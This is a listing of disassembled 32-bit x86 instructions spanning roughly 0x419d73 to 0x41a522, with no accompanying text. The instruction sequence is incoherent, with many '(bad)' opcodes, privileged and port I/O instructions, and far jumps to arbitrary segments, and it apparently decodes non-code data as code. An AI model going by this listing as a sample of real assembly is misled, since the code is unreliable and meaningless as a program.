  419d73:	mov    ds:0xf3a4beb9,al
  419d78:	add    BYTE PTR [edi+0x4],ah
  419d7b:	mov    cl,0xba
  419d7d:	pop    ss
  419d7e:	mov    al,ds:0x45a63c23
  419d83:	ja     0x419d46
  419d85:	ret    
  419d86:	(bad)  
  419d87:	sub    al,0x26
  419d89:	lahf   
  419d8a:	dec    ebx
  419d8b:	add    bl,BYTE PTR [esi+0x38eea49a]
  419d91:	mov    bh,0xa8
  419d93:	mov    bh,dl
  419d95:	popf   
  419d96:	repnz int 0x20
  419d99:	int3   
  419d9a:	add    edx,DWORD PTR [ecx-0x31]
  419d9d:	call   DWORD PTR [eax-0x55d30afc]
  419da3:	icebp  
  419da4:	fdivr  QWORD PTR [ecx-0x4d4ead8e]
  419daa:	jb     0x419da2
  419dac:	jge    0x419df3
  419dae:	test   al,0xe4
  419db0:	and    eax,0x6d742a8f
  419db5:	pop    ds
  419db6:	lea    ebp,[ebx-0x19]
  419db9:	ins    BYTE PTR es:[edi],dx
  419dba:	fist   DWORD PTR gs:[ebx+0x6d]
  419dbe:	pop    ds
  419dbf:	and    ebx,esp
  419dc1:	imul   esp,DWORD PTR [ebp+0xf78e741],0xfffffff5
  419dc8:	in     al,0x84
  419dca:	and    eax,0xdf043e0a
  419dcf:	mov    ch,0xd8
  419dd1:	aaa    
  419dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd3:	call   0x290960e4
  419dd8:	mov    ds:0xfa5f82bb,eax
  419ddd:	or     ebp,ecx
  419ddf:	xchg   edx,eax
  419de0:	das    
  419de1:	or     bl,dl
  419de3:	pop    ebx
  419de4:	stc    
  419de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419de6:	stos   BYTE PTR es:[edi],al
  419de7:	pop    es
  419de8:	push   edx
  419de9:	lods   al,BYTE PTR ds:[esi]
  419dea:	push   ss
  419deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dec:	out    0xdf,al
  419dee:	(bad)  
  419def:	jns    0x419e32
  419df1:	test   al,0xda
  419df3:	aas    
  419df4:	mov    BYTE PTR [ebx-0x1b0f33d3],ch
  419dfa:	mov    DWORD PTR [edx],ecx
  419dfc:	xor    al,0x21
  419dfe:	cld    
  419dff:	pop    eax
  419e00:	cmp    cl,BYTE PTR [edi+0x13]
  419e03:	inc    DWORD PTR [edx+ebp*8]
  419e06:	pushf  
  419e07:	sub    eax,0x6106c054
  419e0c:	loop   0x419dee
  419e0e:	clc    
  419e0f:	xchg   esi,eax
  419e10:	inc    esi
  419e11:	add    DWORD PTR [edx-0x80],ecx
  419e14:	loope  0x419e3e
  419e16:	or     eax,ebp
  419e18:	mov    gs,WORD PTR [ebp*2-0x6c9637e8]
  419e1f:	and    ecx,ebx
  419e21:	sub    eax,0x354d25a7
  419e26:	jo     0x419e1d
  419e28:	jmp    0xcd9b:0xe8869bfa
  419e2f:	fwait
  419e30:	jmp    0x5290:0x9680abcc
  419e37:	int    0xba
  419e39:	popf   
  419e3a:	jb     0x419e5f
  419e3c:	mov    edx,0x9714f012
  419e41:	iret   
  419e42:	loop   0x419e83
  419e44:	cli    
  419e45:	fs xchg esi,eax
  419e47:	xor    ah,cl
  419e49:	cmp    bl,ah
  419e4b:	ret    0x2312
  419e4e:	scas   eax,DWORD PTR es:[edi]
  419e4f:	ret    0x5236
  419e52:	adc    dh,cl
  419e54:	jg     0x419dea
  419e56:	int    0xd9
  419e58:	pop    es
  419e59:	push   ebx
  419e5a:	retf   0x935e
  419e5d:	jle    0x419edc
  419e5f:	test   eax,0x91ea860c
  419e64:	std    
  419e65:	fbld   TBYTE PTR gs:0x1b2bb85c
  419e6c:	pop    esi
  419e6d:	push   ecx
  419e6e:	push   es
  419e6f:	jecxz  0x419e9c
  419e71:	(bad)  
  419e72:	xchg   ecx,eax
  419e73:	ret    0x3ebe
  419e76:	push   esp
  419e77:	mov    bh,BYTE PTR [edi]
  419e79:	test   DWORD PTR [ebx-0xbf6d412],eax
  419e7f:	mov    edx,0xa54a41d8
  419e84:	stos   BYTE PTR es:[edi],al
  419e85:	retf   0xf0b9
  419e88:	add    DWORD PTR [ecx+0x21eb7e53],eax
  419e8e:	adc    eax,0x31ce14a3
  419e93:	inc    ebp
  419e94:	xor    cl,dh
  419e96:	sub    al,BYTE PTR ds:0x9fb46e07
  419e9c:	mov    ds:0x2f242d9b,al
  419ea1:	bound  ebp,QWORD PTR [edi]
  419ea3:	and    BYTE PTR [esi+0x13],dl
  419ea6:	jne    0x419ea1
  419ea8:	(bad)  
  419ea9:	in     eax,0x5
  419eab:	jp     0x419eaa
  419ead:	add    bh,BYTE PTR [ecx-0x20]
  419eb0:	fld    QWORD PTR [esi]
  419eb2:	mov    edx,0x247a1ee3
  419eb7:	(bad)  
  419eb8:	loop   0x419e6d
  419eba:	jmp    0xb7d4:0x2578c023
  419ec1:	mov    dh,0x95
  419ec3:	mov    ah,0x6c
  419ec5:	inc    esp
  419ec6:	pop    ss
  419ec7:	fsubr  st(7),st
  419ec9:	jns    0x419ec2
  419ecb:	dec    esp
  419ecc:	xchg   ecx,eax
  419ecd:	or     DWORD PTR [ecx-0x72],esp
  419ed0:	loop   0x419f42
  419ed2:	and    bl,BYTE PTR [edi]
  419ed4:	push   esi
  419ed5:	ret    0xa1bd
  419ed8:	jns    0xfb3079fc
  419ede:	fld    DWORD PTR [ebp-0x45]
  419ee1:	inc    edi
  419ee2:	das    
  419ee3:	dec    ebx
  419ee5:	std    
  419ee6:	inc    ebx
  419ee7:	stos   BYTE PTR es:[edi],al
  419ee8:	call   0x98c9:0x57d62fd7
  419eef:	jb     0x419e8d
  419ef1:	into   
  419ef2:	das    
  419ef3:	inc    edx
  419ef4:	sbb    ebp,DWORD PTR [edx+ebp*4]
  419ef7:	push   0xffffffdd
  419ef9:	mov    bl,0x6f
  419efb:	add    al,0x47
  419efd:	les    ebp,FWORD PTR [ecx-0x691f5b7b]
  419f03:	bound  esp,QWORD PTR [eax]
  419f05:	sub    BYTE PTR [edx-0x5502f68a],bl
  419f0b:	dec    di
  419f0d:	int3   
  419f0e:	shr    ch,0xdc
  419f11:	ror    DWORD PTR [eax-0x23324328],1
  419f17:	jg     0x419f84
  419f19:	inc    esp
  419f1a:	fsubrp st(3),st
  419f1c:	outs   dx,BYTE PTR ds:[esi]
  419f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f1f:	xor    eax,edi
  419f21:	ficomp DWORD PTR [esi+0x5f893b25]
  419f27:	cmp    DWORD PTR [ecx-0xe],ebp
  419f2a:	ficom  WORD PTR [ecx+0x68ff3901]
  419f30:	mov    esp,0x62b49058
  419f35:	xchg   esi,eax
  419f36:	dec    ecx
  419f37:	(bad)  
  419f38:	push   eax
  419f39:	je     0x419ec3
  419f3b:	rol    BYTE PTR ds:0xaad1ac14,0x58
  419f42:	push   ds
  419f43:	add    esp,DWORD PTR [eax-0x270980ac]
  419f49:	and    BYTE PTR [eax-0x32],ch
  419f4c:	push   eax
  419f4d:	mov    eax,ds:0xfa77ff1a
  419f52:	lahf   
  419f53:	sub    BYTE PTR [ebp-0x458609fc],ch
  419f59:	pop    edx
  419f5a:	test   eax,0x20136125
  419f5f:	scas   eax,DWORD PTR es:[edi]
  419f60:	popa   
  419f61:	je     0x419f1e
  419f63:	ffreep st(0)
  419f65:	add    dl,ah
  419f67:	and    esp,ebx
  419f69:	sbb    cl,ch
  419f6b:	mov    esi,0x37a77ec8
  419f70:	dec    ecx
  419f71:	inc    ebx
  419f72:	arpl   WORD PTR [ebp+0x60],bp
  419f75:	dec    esp
  419f76:	or     esp,edi
  419f78:	(bad)  
  419f79:	enter  0x4117,0x23
  419f7d:	aad    0x43
  419f7f:	repnz sub al,0x6f
  419f82:	cmp    BYTE PTR [ebx+0x5473b2d3],bl
  419f88:	hlt    
  419f89:	sbb    DWORD PTR [ecx-0x6f],ebx
  419f8c:	out    0xb8,eax
  419f8e:	push   0x97661818
  419f93:	xor    DWORD PTR [esi+0x8ea95b2],ecx
  419f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9a:	retf   0xb3c3
  419f9d:	lock push DWORD PTR [ebx]
  419fa0:	jne    0x41a00d
  419fa2:	sbb    esp,DWORD PTR [esi-0x7b]
  419fa5:	mov    cl,0xbf
  419fa7:	lea    esi,[edx-0x4b59b981]
  419fad:	fnstsw WORD PTR [edi+0x533cbc63]
  419fb3:	sbb    eax,0xf67a7bea
  419fb8:	mov    gs,WORD PTR [esi-0x4f]
  419fbb:	push   esi
  419fbc:	cmp    BYTE PTR [edx],ah
  419fbe:	aam    0x41
  419fc0:	push   0x15
  419fc2:	enter  0xd9f3,0x7c
  419fc6:	jmp    0x41a006
  419fc8:	jmp    0x63f057e2
  419fcd:	lock ds inc edx
  419fd0:	popf   
  419fd1:	mov    al,0xb3
  419fd3:	clc    
  419fd4:	sbb    BYTE PTR [edi+0x11c66d39],cl
  419fda:	in     eax,dx
  419fdb:	(bad)  
  419fdc:	jp     0x419f74
  419fde:	mov    bh,0x62
  419fe0:	xor    eax,0xdaeea021
  419fe5:	mov    ebx,0x3413dad6
  419fea:	xchg   ecx,eax
  419feb:	das    
  419fec:	sub    BYTE PTR [edi+eax*8],ah
  419fef:	xchg   DWORD PTR [ebp-0xce870c9],edi
  419ff5:	dec    ebx
  419ff6:	mov    bl,0xe4
  419ff8:	adc    edi,0x4a008f36
  419ffe:	cmp    al,0x85
  41a000:	aaa    
  41a001:	xor    al,0xde
  41a003:	retf   0x3bf3
  41a006:	jnp    0x41a009
  41a008:	lahf   
  41a009:	cs ja  0x419f93
  41a00c:	jnp    0x419fe7
  41a00e:	or     DWORD PTR ds:0xdaaa4dc9,eax
  41a014:	pop    edx
  41a015:	outs   dx,BYTE PTR ds:[esi]
  41a016:	shl    BYTE PTR [edx+0x1539445e],0x68
  41a01d:	mov    eax,ds:0x4b97eede
  41a022:	jmp    0xe5f:0x4fe586be
  41a029:	dec    ecx
  41a02a:	add    eax,0xa842f13
  41a02f:	mov    edi,0x9fad354a
  41a034:	mov    eax,ds:0x8d08222c
  41a039:	dec    esp
  41a03a:	inc    edx
  41a03b:	jmp    0x9a5b9db3
  41a040:	pop    es
  41a041:	imul   ecx,DWORD PTR [edx],0x29
  41a044:	pop    edx
  41a045:	not    BYTE PTR [ebp-0x71b31b8]
  41a04b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a04c:	scas   eax,DWORD PTR es:[edi]
  41a04d:	cwde   
  41a04e:	sbb    al,0x3a
  41a050:	sar    BYTE PTR ds:0x4298b43f,0x22
  41a057:	and    ch,BYTE PTR [eax-0x37]
  41a05a:	cwde   
  41a05b:	cdq    
  41a05c:	hlt    
  41a05d:	imul   esp,DWORD PTR [ecx+0x4b],0xffffff98
  41a061:	rcr    dh,0xb3
  41a064:	pop    esi
  41a065:	inc    ebx
  41a066:	lods   al,BYTE PTR ds:[esi]
  41a067:	mov    es,ebp
  41a069:	mov    bl,0x68
  41a06b:	push   0x1e
  41a06d:	mov    ch,0x5c
  41a06f:	sub    eax,0xc23b3b16
  41a074:	outs   dx,DWORD PTR ds:[esi]
  41a075:	aam    0xc7
  41a077:	pop    ds
  41a078:	pop    esp
  41a079:	add    esi,DWORD PTR [ecx]
  41a07b:	cld    
  41a07c:	mov    ds:0xd1047534,al
  41a081:	xchg   esi,eax
  41a082:	in     al,dx
  41a083:	add    BYTE PTR [edx-0x27e4f638],cl
  41a089:	dec    esp
  41a08a:	outs   dx,BYTE PTR ds:[esi]
  41a08b:	mov    al,0x6e
  41a08d:	mov    ds:0x90e24bf3,eax
  41a092:	retf   0xf148
  41a095:	popf   
  41a096:	mov    dl,0xf0
  41a098:	push   esi
  41a099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a09a:	pinsrw mm2,WORD PTR [ebp+0x5b],0x11
  41a09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a0:	fcomp  st(1)
  41a0a2:	fucomi st,st(0)
  41a0a4:	sub    DWORD PTR [eiz*2-0x46fbe7ff],esp
  41a0ab:	jae    0x41a129
  41a0ad:	sbb    al,BYTE PTR [ebx+0x56aa6a02]
  41a0b3:	enter  0x5685,0xcd
  41a0b7:	ds dec esi
  41a0b9:	pop    esp
  41a0ba:	sbb    al,0x4e
  41a0bc:	push   esp
  41a0bd:	je     0x41a0ba
  41a0bf:	fstp   TBYTE PTR [esi-0x2545df40]
  41a0c5:	inc    esp
  41a0c6:	mov    dl,0xec
  41a0c8:	sbb    BYTE PTR [ebx],al
  41a0ca:	mov    cl,0xa6
  41a0cc:	pop    edi
  41a0cd:	adc    cl,BYTE PTR [ecx+0x55]
  41a0d0:	and    eax,0xbbd9f4f5
  41a0d5:	pop    es
  41a0d6:	adc    al,0xf3
  41a0d8:	mov    esp,DWORD PTR [esi+0x49]
  41a0db:	adc    edx,DWORD PTR [ebp+0x16]
  41a0de:	js     0x41a139
  41a0e0:	retf   
  41a0e1:	xchg   edi,eax
  41a0e2:	mov    edx,0x7c6afe4c
  41a0e7:	and    ch,BYTE PTR [edx]
  41a0e9:	mov    ds:0x2c251efa,eax
  41a0ee:	bound  edx,QWORD PTR [ebp+0x6]
  41a0f1:	(bad)  
  41a0f2:	fcos   
  41a0f4:	enter  0xdefd,0x7a
  41a0f8:	lods   eax,DWORD PTR ds:[esi]
  41a0f9:	test   DWORD PTR gs:0xc02a7ee4,edi
  41a100:	pushf  
  41a101:	and    eax,0x15c3929a
  41a106:	sub    eax,0xbaf00c5c
  41a10b:	int3   
  41a10c:	jmp    0x41a142
  41a10e:	popf   
  41a10f:	lahf   
  41a110:	test   DWORD PTR ds:0x8dc7f0cd,edi
  41a116:	mov    esi,DWORD PTR [ebp+eax*2+0x4030a40a]
  41a11d:	outs   dx,DWORD PTR ds:[esi]
  41a11e:	pop    ecx
  41a11f:	and    DWORD PTR [ecx+0x347dbda8],ecx
  41a125:	cmp    BYTE PTR [ebp-0x2e],0x7
  41a129:	bound  esp,QWORD PTR [ebx]
  41a12b:	jbe    0x41a134
  41a12d:	mov    ecx,edi
  41a12f:	add    eax,0x619b1c73
  41a134:	dec    DWORD PTR [esi]
  41a136:	out    0xf9,eax
  41a138:	test   al,0xb5
  41a13a:	ins    DWORD PTR es:[edi],dx
  41a13b:	jle    0x41a144
  41a13d:	ror    BYTE PTR [esi-0x4839da66],0xd5
  41a144:	stos   BYTE PTR es:[edi],al
  41a145:	bound  ebx,QWORD PTR [esi+0x5584eb13]
  41a14b:	imul   esi,esi,0xc9e7f726
  41a151:	sbb    ebp,eax
  41a153:	pop    ss
  41a154:	mov    ah,0x26
  41a156:	les    edi,FWORD PTR [ebx-0x76eed5e]
  41a15c:	jne    0x41a0e7
  41a15e:	cmp    eax,0xb5428f92
  41a163:	out    0x5f,al
  41a165:	jnp    0x41a158
  41a167:	adc    eax,0xb1115924
  41a16c:	imul   eax,DWORD PTR [esi-0x4],0x4
  41a170:	adc    bl,BYTE PTR [edi+0x2c76abcb]
  41a176:	add    eax,0xbf03a5d6
  41a17b:	fmul   QWORD PTR [ebx]
  41a17d:	in     al,0x61
  41a17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a180:	inc    ebx
  41a181:	push   ecx
  41a182:	add    ch,cl
  41a184:	fistp  QWORD PTR [ebp-0x23b45524]
  41a18a:	out    dx,eax
  41a18b:	xchg   esi,eax
  41a18c:	sbb    ch,ah
  41a18e:	pusha  
  41a18f:	adc    ebp,DWORD PTR [ecx-0x7ed84b42]
  41a195:	ret    0x835c
  41a198:	sbb    eax,0xecbd98b2
  41a19d:	mov    BYTE PTR [edi],ch
  41a19f:	adc    eax,0x54cd7b42
  41a1a4:	mov    esp,0x59614b18
  41a1a9:	sbb    DWORD PTR [esi+0x68],ebp
  41a1ac:	jp     0x41a1a1
  41a1ae:	fild   QWORD PTR [edi]
  41a1b0:	dec    eax
  41a1b1:	push   cs
  41a1b2:	dec    edx
  41a1b3:	push   0xa94209b6
  41a1b8:	sbb    ebx,DWORD PTR [eax+0x54b62bcd]
  41a1be:	and    al,0x92
  41a1c0:	or     BYTE PTR [eax+0x195733bf],ch
  41a1c6:	inc    edi
  41a1c7:	cmp    cl,BYTE PTR [eax+0x6a]
  41a1ca:	jg     0x41a207
  41a1cc:	jmp    0xb6bb9a5f
  41a1d1:	(bad)  
  41a1d2:	loop   0x41a1c7
  41a1d4:	leavew 
  41a1d6:	add    BYTE PTR [edx-0x59f667b9],bh
  41a1dc:	jecxz  0x41a1db
  41a1de:	aad    0x41
  41a1e0:	pop    es
  41a1e1:	push   esi
  41a1e2:	pop    esp
  41a1e3:	inc    edi
  41a1e4:	jmp    0x41a249
  41a1e6:	mov    edi,0x9feb0f92
  41a1eb:	(bad)
  41a1ef:	sti    
  41a1f0:	push   ebp
  41a1f1:	or     esp,DWORD PTR [ebx+eiz*4]
  41a1f4:	mov    cl,0x5b
  41a1f6:	pop    eax
  41a1f7:	push   0xfffffff6
  41a1f9:	rdpmc  
  41a1fb:	jl     0x41a1e1
  41a1fd:	dec    ebx
  41a1fe:	cmc    
  41a1ff:	addr16 dec ecx
  41a201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a202:	mov    cl,0x89
  41a204:	push   esi
  41a205:	xor    ecx,DWORD PTR [ecx]
  41a207:	dec    ebx
  41a208:	(bad)  
  41a209:	pushf  
  41a20a:	scas   eax,DWORD PTR es:[edi]
  41a20b:	mov    ah,0x37
  41a20d:	jecxz  0x41a199
  41a20f:	mov    esp,0x31d5da8e
  41a214:	repnz ins BYTE PTR es:[edi],dx
  41a216:	call   0x78906b2d
  41a21b:	pop    ebp
  41a21c:	stos   BYTE PTR es:[edi],al
  41a21d:	or     edx,edx
  41a21f:	(bad)  
  41a220:	and    ebx,esp
  41a222:	jnp    0x41a216
  41a224:	popf   
  41a225:	js     0x41a1e5
  41a227:	push   esp
  41a228:	sahf   
  41a229:	mov    edx,fs
  41a22b:	test   eax,0x309d7a58
  41a230:	xlat   BYTE PTR ds:[ebx]
  41a231:	loop   0x41a276
  41a233:	or     BYTE PTR [eax],al
  41a235:	jne    0x41a1e1
  41a237:	outs   dx,BYTE PTR ds:[esi]
  41a238:	std    
  41a239:	adc    cl,BYTE PTR [edx-0x2c]
  41a23c:	mov    ebx,0x6679d921
  41a241:	sub    al,0x7c
  41a243:	and    ebx,ebp
  41a245:	pop    eax
  41a246:	out    0x6,eax
  41a248:	(bad)  [ecx]
  41a24a:	rcr    DWORD PTR [edx+0x1f8d9f94],1
  41a250:	mov    bl,0x13
  41a252:	jno    0x41a2c9
  41a254:	(bad)  
  41a256:	out    0x9c,eax
  41a258:	test   al,0xf7
  41a25a:	push   esp
  41a25b:	jae    0x41a20b
  41a25d:	lods   eax,DWORD PTR ds:[esi]
  41a25e:	cmp    cl,ch
  41a260:	mov    al,ds:0x2e68a1a5
  41a265:	dec    edi
  41a266:	add    BYTE PTR [ebp-0x1a],dh
  41a269:	xor    eax,0xb056c416
  41a26e:	test   DWORD PTR ds:0xef453904,eax
  41a274:	dec    ecx
  41a275:	fdivp  st(2),st
  41a277:	leave  
  41a278:	repnz mov cl,BYTE PTR ds:0xb61c1906
  41a27f:	cmp    bl,BYTE PTR [esi-0x63]
  41a282:	xchg   BYTE PTR [esi+0x31],bh
  41a285:	cs jns 0x41a2e4
  41a288:	push   edx
  41a289:	xchg   edi,edx
  41a28b:	adc    eax,0x6614f27d
  41a290:	scas   al,BYTE PTR es:[edi]
  41a291:	pop    esp
  41a292:	mov    ah,0x27
  41a294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a295:	cdq    
  41a296:	jle    0x41a295
  41a298:	mov    bh,0xee
  41a29a:	and    bh,dl
  41a29c:	pop    esp
  41a29d:	add    BYTE PTR [ecx],0xfe
  41a2a0:	pusha  
  41a2a1:	adc    edx,esi
  41a2a3:	int    0x12
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	push   0xffffffe5
  41a2a8:	inc    eax
  41a2a9:	ja     0x41a2f3
  41a2ab:	adc    esp,edx
  41a2ad:	cmp    dl,dh
  41a2af:	push   esp
  41a2b0:	dec    edi
  41a2b1:	sbb    BYTE PTR [edi],ch
  41a2b3:	and    esp,DWORD PTR [eax+esi*4-0x6f]
  41a2b7:	outs   dx,BYTE PTR ds:[esi]
  41a2b8:	xor    eax,0x61d76004
  41a2bd:	repnz fistp WORD PTR [edx+0x5df97edb]
  41a2c4:	push   0x5
  41a2c6:	add    DWORD PTR [ecx*2+0x313885f5],esp
  41a2cd:	loopne 0x41a2b4
  41a2cf:	sar    DWORD PTR [ebx+esi*2+0x46],1
  41a2d3:	stc    
  41a2d4:	repz stc 
  41a2d6:	fcomp  st(0)
  41a2d8:	fsubr  DWORD PTR [eax-0x3c035859]
  41a2de:	pushf  
  41a2df:	shr    BYTE PTR [esi+0x32bc08ea],0x4e
  41a2e6:	jne    0x41a312
  41a2e8:	cld    
  41a2e9:	xor    bh,bh
  41a2eb:	neg    DWORD PTR [esi+0x35]
  41a2ee:	pop    ebx
  41a2ef:	mov    al,0xdd
  41a2f1:	shl    ecx,cl
  41a2f3:	stos   DWORD PTR es:[edi],eax
  41a2f4:	or     bl,BYTE PTR [ebx]
  41a2f6:	pop    ebp
  41a2f7:	pusha  
  41a2f8:	sbb    bl,cl
  41a2fa:	mov    ss,ebp
  41a2fc:	cld    
  41a2fd:	cmp    BYTE PTR [esi+0x32],0x7b
  41a301:	aas    
  41a302:	cmp    eax,DWORD PTR [esi+0x28]
  41a305:	pop    ds
  41a306:	mov    esp,0x5e53b5dd
  41a30b:	cmp    al,0x3b
  41a30d:	add    ah,BYTE PTR [esi]
  41a30f:	cmc    
  41a310:	(bad)  
  41a311:	mov    bl,BYTE PTR [ecx-0x68]
  41a314:	scas   eax,DWORD PTR es:[edi]
  41a315:	inc    ebx
  41a316:	mov    ebp,0xc6b25ca
  41a31b:	mov    esi,0x55442d7a
  41a320:	sub    bh,ch
  41a322:	ret    0xc371
  41a325:	fnstsw WORD PTR [eax+0x31]
  41a328:	or     ch,ah
  41a32a:	bound  ebx,QWORD PTR [ecx+0x56]
  41a32d:	arpl   WORD PTR [ecx],sp
  41a32f:	fdivrp st(4),st
  41a331:	retf   0x7478
  41a334:	sub    BYTE PTR [esi-0xb],bl
  41a337:	jo     0x41a3b2
  41a339:	mov    ecx,0xcd7f26fb
  41a33e:	xchg   esi,eax
  41a33f:	(bad)  
  41a340:	popa   
  41a341:	repz and ch,BYTE PTR [ebx+0x34]
  41a345:	arpl   WORD PTR [ebp+eiz*8+0x39],bx
  41a349:	data16 mov ds:0x9cd04012,al
  41a34f:	xchg   ebx,eax
  41a350:	ds mov bl,bl
  41a353:	je     0x41a3aa
  41a355:	imul   ebp,DWORD PTR [edx+esi*4],0x2b
  41a359:	push   edx
  41a35a:	add    dh,BYTE PTR ds:0xc99a219c
  41a360:	in     al,dx
  41a361:	inc    ecx
  41a362:	call   0x4a7f:0xe83e98c6
  41a369:	or     eax,0xf788d838
  41a36e:	push   cs
  41a36f:	outs   dx,DWORD PTR ds:[esi]
  41a370:	dec    ebp
  41a371:	and    ah,dl
  41a373:	das    
  41a374:	push   ss
  41a375:	cmc    
  41a376:	push   ss
  41a377:	pop    edx
  41a378:	jl     0x41a3ed
  41a37a:	div    DWORD PTR ds:0xdb36bd92
  41a380:	data16 jno 0x41a3a0
  41a383:	jge    0x41a3ed
  41a385:	pop    ds
  41a386:	and    BYTE PTR [eax],al
  41a388:	int    0x4d
  41a38a:	push   esi
  41a38b:	pop    ebp
  41a38c:	retf   
  41a38d:	lea    ecx,[eax-0x69]
  41a390:	xchg   edx,eax
  41a391:	inc    edx
  41a392:	push   es
  41a393:	lds    eax,FWORD PTR [edi+0x4769ceeb]
  41a399:	sub    al,0x91
  41a39b:	mov    ecx,0x17649d0d
  41a3a0:	leave  
  41a3a1:	xchg   esp,eax
  41a3a2:	cmp    bh,0xe2
  41a3a5:	mov    edx,0x7094fcfb
  41a3aa:	add    DWORD PTR [ebx],ebp
  41a3ac:	jno    0x41a344
  41a3ae:	and    DWORD PTR [eax-0x4a4c3943],0x36eb7c39
  41a3b8:	test   BYTE PTR [edx+0x373da744],dl
  41a3be:	mov    ecx,gs
  41a3c0:	push   ebx
  41a3c1:	(bad)  
  41a3c2:	das    
  41a3c3:	xor    BYTE PTR [ecx],cl
  41a3c5:	popf   
  41a3c6:	mov    eax,ds:0x881ac431
  41a3cb:	int    0x63
  41a3cd:	fbld   TBYTE PTR [ecx-0x2570903b]
  41a3d3:	pop    ds
  41a3d4:	arpl   WORD PTR [eax-0x59],si
  41a3d7:	retf   0x4790
  41a3da:	test   eax,esp
  41a3dc:	cmp    eax,0x9b07071b
  41a3e1:	out    0xc9,eax
  41a3e3:	cmp    BYTE PTR cs:[ecx+0x6f],al
  41a3e7:	adc    eax,0x34798149
  41a3ec:	mov    edi,0x350a37db
  41a3f1:	cs stos BYTE PTR es:[edi],al
  41a3f3:	popa   
  41a3f4:	pop    ss
  41a3f5:	mov    ecx,fs
  41a3f7:	addr16 popf 
  41a3f9:	xchg   DWORD PTR [eax],ecx
  41a3fb:	jns    0x41a3b1
  41a3fd:	adc    DWORD PTR [ebx+0x55ae35ad],esi
  41a403:	aas    
  41a404:	push   ebp
  41a405:	fs dec esp
  41a407:	aad    0xdb
  41a409:	sbb    ebx,DWORD PTR [ecx+0x2a]
  41a40c:	aas    
  41a40d:	rol    DWORD PTR [esp+ecx*8+0x5c],1
  41a411:	mov    eax,ds:0xfe63ac33
  41a416:	mov    cl,0xac
  41a418:	loopne 0x41a423
  41a41a:	sbb    al,0x4e
  41a41c:	sub    eax,0x117059b5
  41a421:	lgdtd  [edx-0x8b4bcf4]
  41a428:	jecxz  0x41a40e
  41a42a:	xchg   ecx,eax
  41a42b:	call   0x76b63522
  41a430:	mov    WORD PTR [ecx-0x6aff1114],ss
  41a436:	cmc    
  41a437:	pop    ebp
  41a438:	xchg   edx,eax
  41a439:	sar    BYTE PTR [edx],1
  41a43b:	or     eax,DWORD PTR [eax+0x32]
  41a43e:	sbb    DWORD PTR [esi+0x4f],edi
  41a441:	cwde   
  41a442:	fs cdq 
  41a444:	add    DWORD PTR [esi],0x24dd1b2d
  41a44a:	mov    ah,0xfd
  41a44c:	push   0x7eec45c9
  41a451:	cmc    
  41a452:	imul   esp,DWORD PTR [esi],0xf9e216ac
  41a458:	lods   al,BYTE PTR ds:[esi]
  41a459:	pop    ss
  41a45a:	addr16 int 0xcc
  41a45d:	adc    esi,ebx
  41a45f:	jl     0x41a423
  41a461:	out    0xa2,al
  41a463:	loopne 0x41a43d
  41a465:	adc    eax,0x874dd96e
  41a46a:	xchg   ebp,eax
  41a46b:	sbb    DWORD PTR [ecx-0x6b518a2e],ebx
  41a471:	fstp   QWORD PTR [edx+0x26]
  41a474:	stc    
  41a475:	sub    ebp,DWORD PTR [edi*2+0x4c3fda92]
  41a47c:	rcr    eax,cl
  41a47e:	mov    BYTE PTR [ecx+0x71],dl
  41a481:	daa    
  41a482:	inc    ecx
  41a483:	and    DWORD PTR [eax-0x6b8f7be3],0xffffffa1
  41a48a:	scas   eax,DWORD PTR es:[edi]
  41a48b:	cwde   
  41a48c:	retf   
  41a48d:	cli    
  41a48e:	sub    BYTE PTR [edx-0x2],bl
  41a491:	rol    ebp,1
  41a493:	ds jmp 0x3086:0x973a5c57
  41a49b:	pop    ebp
  41a49c:	dec    esp
  41a49d:	vandps xmm0,xmm3,XMMWORD PTR [ebp+0x17]
  41a4a2:	loope  0x41a517
  41a4a4:	mov    ebx,DWORD PTR [eax-0x30]
  41a4a7:	ret    0xe139
  41a4aa:	scas   al,BYTE PTR es:[edi]
  41a4ab:	inc    eax
  41a4ac:	push   0xffffffb7
  41a4ae:	sbb    al,0xbb
  41a4b0:	cs dec ebx
  41a4b2:	push   esi
  41a4b3:	jmp    0x42ff7acb
  41a4b8:	pop    esp
  41a4b9:	push   ss
  41a4ba:	jmp    ebx
  41a4bc:	ret    
  41a4bd:	leave  
  41a4be:	sub    al,0x7b
  41a4c0:	sub    ecx,DWORD PTR [ebp+0x1864c998]
  41a4c6:	out    0xa6,eax
  41a4c8:	xchg   DWORD PTR [ebp-0x53c1152f],edx
  41a4ce:	loopne 0x41a546
  41a4d0:	inc    eax
  41a4d1:	ret    0xd9fc
  41a4d4:	xor    eax,0x89960f0c
  41a4d9:	fisubr WORD PTR [edi+0x6a12d245]
  41a4df:	mov    eax,0x409656ae
  41a4e4:	push   ebx
  41a4e5:	push   0xb
  41a4e7:	fidiv  WORD PTR [ebx]
  41a4e9:	test   eax,0x6d05326f
  41a4ee:	mov    ebx,0xb70372d9
  41a4f4:	push   eax
  41a4f5:	fdivr  QWORD PTR [ebx-0x1068f130]
  41a4fb:	shl    bl,0x16
  41a4fe:	jo     0x41a50e
  41a500:	pop    edx
  41a501:	outs   dx,BYTE PTR ds:[esi]
  41a502:	and    DWORD PTR [ebp+ecx*1-0x34],esi
  41a506:	sub    DWORD PTR [ecx+0x72],esp
  41a509:	cmp    al,0x14
  41a50b:	imul   DWORD PTR [ebx]
  41a50d:	mov    ebp,0x1c050c10
  41a512:	dec    edx
  41a513:	mov    bh,0xc3
  41a515:	push   esi
  41a516:	pop    es
  41a517:	addr16 ret 
  41a519:	loopne 0x41a4af
  41a51b:	or     al,dl
  41a51d:	mov    bl,BYTE PTR [ecx-0x1e]
  41a520:	pop    esp
  41a521:	lods   al,BYTE PTR ds:[esi]
  41a522:	jg     0x41a4f4
